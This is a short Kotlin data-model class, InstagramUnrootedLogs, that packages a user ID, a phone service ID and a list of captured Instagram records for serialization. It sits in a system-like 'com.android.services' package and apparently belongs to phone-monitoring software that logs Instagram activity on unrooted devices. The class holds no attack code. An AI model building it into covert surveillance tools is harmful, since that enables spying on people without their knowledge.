package com.android.services.models

import com.android.services.db.entities.InstagramUnrooted
import com.google.gson.annotations.SerializedName

class InstagramUnrootedLogs {
    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("data")
    var instagramUnrootedList: List<InstagramUnrooted>? = null
        private set

    constructor()
    constructor(
        userId: String?,
        phoneServiceId: String?,
        instagramUnrootedList: List<InstagramUnrooted>?
    ) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        this.instagramUnrootedList = instagramUnrootedList
    }
}